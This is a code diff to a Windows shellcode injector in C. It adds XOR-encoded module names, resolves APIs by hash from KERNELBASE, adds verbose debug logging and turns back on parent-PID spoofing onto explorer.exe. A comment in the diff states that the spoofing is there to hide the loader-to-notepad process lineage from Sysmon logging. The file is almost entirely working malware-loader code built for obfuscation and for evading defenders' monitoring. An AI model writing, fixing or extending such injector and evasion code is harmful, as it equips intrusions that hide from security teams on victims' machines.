@@ -41,6 +41,18 @@ static const uint8_t _enc_target[] = {
     0x19
 };
 
+/* "KERNELBASE.dll" (wide, 14 wchars, 6-byte XOR). Init/Update/Delete
+ * ProcThreadAttributeList are forwarder exports from kernel32 to
+ * KERNELBASE on modern Windows; peb_find_export doesn't follow
+ * forwarders, so we re-resolve them from KERNELBASE directly below. */
+static const uint8_t _enc_key_kbase_w[6] = { 0xc3, 0xab, 0x2c, 0x1c, 0xf6, 0x9a };
+static const uint8_t _enc_kbasedll_w[28] = {
+    0x88, 0xab, 0x69, 0x1c, 0xa4, 0x9a, 0x8d, 0xab,
+    0x69, 0x1c, 0xba, 0x9a, 0x81, 0xab, 0x6d, 0x1c,
+    0xa5, 0x9a, 0x86, 0xab, 0x02, 0x1c, 0x92, 0x9a,
+    0xaf, 0xab, 0x40, 0x1c
+};
+
 /* ---- kernel32 function-pointer typedefs ---- */
 typedef BOOL (WINAPI *CreateProcessA_t)(LPSTR, LPSTR, LPSECURITY_ATTRIBUTES,
     LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR,
@@ -120,27 +132,55 @@ static DWORD find_explorer_pid(
     Process32NextW_t          pNext,
     CloseHandle_t             pClose)
 {
+    DBG_PRINTF("[fep] enter pSnap=%p pFirst=%p pNext=%p pClose=%p\n",
+               pSnap, pFirst, pNext, pClose);
     HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE || hSnap == NULL)
+    DBG_PRINTF("[fep] pSnap returned hSnap=%p\n", hSnap);
+    if (hSnap == INVALID_HANDLE_VALUE || hSnap == NULL) {
+        DBG_PRINTF("[fep] bad hSnap, returning 0\n");
         return 0;
+    }
 
     PROCESSENTRY32W pe;
     ZeroMemory(&pe, sizeof(pe));
     pe.dwSize = sizeof(pe);
+    DBG_PRINTF("[fep] pe prepared sizeof=%zu dwSize=%lu\n",
+               sizeof(pe), (unsigned long)pe.dwSize);
 
     DWORD pid = 0;
-    if (pFirst(hSnap, &pe)) {
+    DBG_PRINTF("[fep] calling pFirst\n");
+    BOOL firstOK = pFirst(hSnap, &pe);
+    DBG_PRINTF("[fep] pFirst returned %d pid=%lu szExeFile[0]=0x%04x\n",
+               firstOK, (unsigned long)pe.th32ProcessID,
+               (unsigned)pe.szExeFile[0]);
+    if (firstOK) {
+        int iter = 0;
         do {
+            DBG_PRINTF("[fep] iter=%d pid=%lu szExeFile[0]=0x%04x\n",
+                       iter, (unsigned long)pe.th32ProcessID,
+                       (unsigned)pe.szExeFile[0]);
             if (is_explorer(pe.szExeFile)) {
                 pid = pe.th32ProcessID;
+                DBG_PRINTF("[fep] FOUND explorer at iter=%d pid=%lu\n",
+                           iter, (unsigned long)pid);
                 break;
             }
             ZeroMemory(&pe, sizeof(pe));
             pe.dwSize = sizeof(pe);
+            iter++;
+            if (iter > 1000) {
+                DBG_PRINTF("[fep] iter cap hit, bailing\n");
+                break;
+            }
+            DBG_PRINTF("[fep] calling pNext iter=%d\n", iter);
         } while (pNext(hSnap, &pe));
+        DBG_PRINTF("[fep] loop exit iter=%d pid=%lu\n",
+                   iter, (unsigned long)pid);
     }
 
+    DBG_PRINTF("[fep] calling pClose(hSnap=%p)\n", hSnap);
     pClose(hSnap);
+    DBG_PRINTF("[fep] pClose returned, final pid=%lu\n", (unsigned long)pid);
     return pid;
 }
 
@@ -190,6 +230,27 @@ BOOL inject_shellcode(const uint8_t *shellcode, size_t len)
     DBG_PRINTF("[inject] soft k32 APIs resolved (toolhelp=%p,proc32f=%p,proc32n=%p,openproc=%p,init=%p,upd=%p,del=%p)\n",
                pCreateToolhelp32Snapshot, pProcess32FirstW, pProcess32NextW,
                pOpenProcess, pInitAttrList, pUpdateAttr, pDeleteAttrList);
+
+    /* kernel32's Init/Update/Delete ProcThreadAttributeList are forwarders
+     * pointing at KERNELBASE; peb_find_export returns the forwarder-string
+     * address (not a real function), so calling the kernel32-resolved
+     * pointers SEGVs. Re-resolve from KERNELBASE directly. */
+    wchar_t kbase_w[16];
+    ZeroMemory(kbase_w, sizeof(kbase_w));
+    xor_dec_w_mb(kbase_w, _enc_kbasedll_w, 14, _enc_key_kbase_w, 6);
+    HMODULE hKbase = peb_get_module(kbase_w);
+    secure_zero(kbase_w, sizeof(kbase_w));
+    if (hKbase) {
+        pInitAttrList   = (InitializeProcThreadAttributeList_t)peb_find_export(hKbase, HASH_InitializeProcThreadAttributeList);
+        pUpdateAttr     = (UpdateProcThreadAttribute_t)peb_find_export(hKbase, HASH_UpdateProcThreadAttribute);
+        pDeleteAttrList = (DeleteProcThreadAttributeList_t)peb_find_export(hKbase, HASH_DeleteProcThreadAttributeList);
+    } else {
+        pInitAttrList = NULL;
+        pUpdateAttr = NULL;
+        pDeleteAttrList = NULL;
+    }
+    DBG_PRINTF("[inject] KERNELBASE re-resolved: hKbase=%p init=%p upd=%p del=%p\n",
+               hKbase, pInitAttrList, pUpdateAttr, pDeleteAttrList);
     /* Decode target process name at runtime */
     char target[18];
     xor_dec_mb(target, _enc_target, 17, _enc_key_target, 2);
@@ -201,46 +262,67 @@ BOOL inject_shellcode(const uint8_t *shellcode, size_t len)
     HANDLE  hParent = NULL;
     BOOL    ppid_ok  = FALSE;
 
-    /* VM lab build: skip PPID spoofing entirely (walks the process list,
-     * which has been flaky on Win11 24H2 inside KVM). */
-    if (0 && pCreateToolhelp32Snapshot && pProcess32FirstW && pProcess32NextW &&
+    /* PPID spoofing onto explorer.exe to mask the loader -> notepad Sysmon
+     * Event 1 lineage. Every miss below degrades silently to the plain
+     * CreateProcessA path — injection success is never gated on spoofing. */
+    if (pCreateToolhelp32Snapshot && pProcess32FirstW && pProcess32NextW &&
         pOpenProcess && pInitAttrList && pUpdateAttr && pDeleteAttrList) {
 
         DWORD pid = find_explorer_pid(pCreateToolhelp32Snapshot,
                                       pProcess32FirstW,
                                       pProcess32NextW,
                                       pCloseHandle);
+        DBG_PRINTF("[ppid] find_explorer_pid returned %lu\n", (unsigned long)pid);
         if (pid != 0) {
+            DBG_PRINTF("[ppid] calling pOpenProcess(0x%X, FALSE, %lu)\n",
+                       (unsigned)PROCESS_CREATE_PROCESS, (unsigned long)pid);
             hParent = pOpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
+            DBG_PRINTF("[ppid] pOpenProcess returned hParent=%p\n", hParent);
             if (hParent && hParent != INVALID_HANDLE_VALUE) {
-                /* Size the attribute list first (NULL list -> returns the
-                 * required byte count; documented to return FALSE here). */
                 SIZE_T attrSize = 0;
-                pInitAttrList(NULL, 1, 0, &attrSize);
-                /* Stack buffer; PROC_THREAD_ATTRIBUTE_LIST is opaque, so we
-                 * hold it as raw bytes and cast. One attribute fits in 256B
-                 * on x64. */
+                DBG_PRINTF("[ppid] calling pInitAttrList(NULL, 1, 0, &attrSize)\n");
+                BOOL rc_init_null = pInitAttrList(NULL, 1, 0, &attrSize);
+                DBG_PRINTF("[ppid] pInitAttrList(NULL) rc=%d attrSize=%zu\n",
+                           rc_init_null, (size_t)attrSize);
                 unsigned char attr_buf[256];
                 if (attrSize != 0 && attrSize <= sizeof(attr_buf)) {
                     pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)attr_buf;
-                    if (pInitAttrList(pAttrList, 1, 0, &attrSize) &&
-                        pUpdateAttr(pAttrList, 0,
+                    DBG_PRINTF("[ppid] calling pInitAttrList(%p, 1, 0, &attrSize=%zu)\n",
+                               pAttrList, (size_t)attrSize);
+                    BOOL rc_init = pInitAttrList(pAttrList, 1, 0, &attrSize);
+                    DBG_PRINTF("[ppid] pInitAttrList(actual) rc=%d\n", rc_init);
+                    if (rc_init) {
+                        DBG_PRINTF("[ppid] calling pUpdateAttr PARENT_PROCESS hParent=%p sz=%zu\n",
+                                   hParent, (size_t)sizeof(hParent));
+                        BOOL rc_upd = pUpdateAttr(pAttrList, 0,
                                     PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                     &hParent, sizeof(hParent),
-                                    NULL, NULL)) {
-                        ppid_ok = TRUE;
+                                    NULL, NULL);
+                        DBG_PRINTF("[ppid] pUpdateAttr rc=%d\n", rc_upd);
+                        if (rc_upd) {
+                            ppid_ok = TRUE;
+                        } else {
+                            DBG_PRINTF("[ppid] Update failed, calling pDeleteAttrList\n");
+                            pDeleteAttrList(pAttrList);
+                            pAttrList = NULL;
+                        }
                     } else {
-                        pDeleteAttrList(pAttrList);
+                        DBG_PRINTF("[ppid] Init failed, NOT calling pDeleteAttrList (uninit list)\n");
                         pAttrList = NULL;
                     }
+                } else {
+                    DBG_PRINTF("[ppid] attrSize out of range (0 or > %zu)\n", (size_t)sizeof(attr_buf));
                 }
                 if (!ppid_ok) {
+                    DBG_PRINTF("[ppid] ppid_ok=FALSE, closing hParent\n");
                     pCloseHandle(hParent);
                     hParent = NULL;
                 }
             }
         }
     }
+    DBG_PRINTF("[ppid] block done, ppid_ok=%d pAttrList=%p hParent=%p\n",
+               ppid_ok, pAttrList, hParent);
 
     DBG_PRINTF("[inject] past PPID block, ppid_ok=%d, calling CreateProcessA target='%s'\n",
                ppid_ok, target);
